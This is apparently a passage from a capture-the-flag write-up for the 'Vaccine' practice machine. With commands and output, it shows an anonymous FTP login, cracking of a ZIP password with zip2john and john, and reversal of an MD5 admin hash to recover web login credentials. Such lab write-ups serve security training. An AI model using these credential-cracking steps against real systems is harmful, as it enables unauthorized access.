Anonymous login is possible and we can return backup.zip file but is password protected

```bash
┌──(kali㉿kali)-[~]
└─$ ftp 10.129.107.183     
Connected to 10.129.107.183.
220 (vsFTPd 3.0.3)
Name (10.129.107.183:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||10582|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
```

Trying to unzip with empty password fails

```bash
┌──(kali㉿kali)-[~/Documents/StartingPoint/Vaccine]
└─$ unzip backup.zip    
Archive:  backup.zip
[backup.zip] index.php password: 
   skipping: index.php               incorrect password
   skipping: style.css               incorrect password
```

With zip2john we can crack the password

```bash
┌──(kali㉿kali)-[~/Documents/StartingPoint/Vaccine]
└─$ ./zip2john backup.zip > backup.hash 
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                            
┌──(kali㉿kali)-[~/Documents/StartingPoint/Vaccine]
└─$ cat backup.hash        
backup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a**$/pkzip$::backup.zip:style.css, index.php:backup.zip
                                                                            
┌──(kali㉿kali)-[~/Documents/StartingPoint/Vaccine]
└─$ john -w=/usr/share/wordlists/rockyou.txt backup.hash           
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2023-07-19 00:41) 25.00g/s 102400p/s 102400c/s 102400C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We got the password for the zip file, which is 741852963

```bash
┌──(kali㉿kali)-[~/Documents/StartingPoint/Vaccine]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css               
                                                                            
┌──(kali㉿kali)-[~/Documents/StartingPoint/Vaccine]
└─$ ls
backup.hash  backup.zip  index.php  nmap  style.css  zip2john
```

If we cat the index.php file we can see the admin password encrypted in md5 format

```bash
┌──(kali㉿kali)-[~/Documents/StartingPoint/Vaccine]
└─$ cat backup/index.php 
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
```

Searching in google to reverse md5 we found **[this web](http://reversemd5.com/)** and here we can get the admin credentials, which are admin:qwerty789
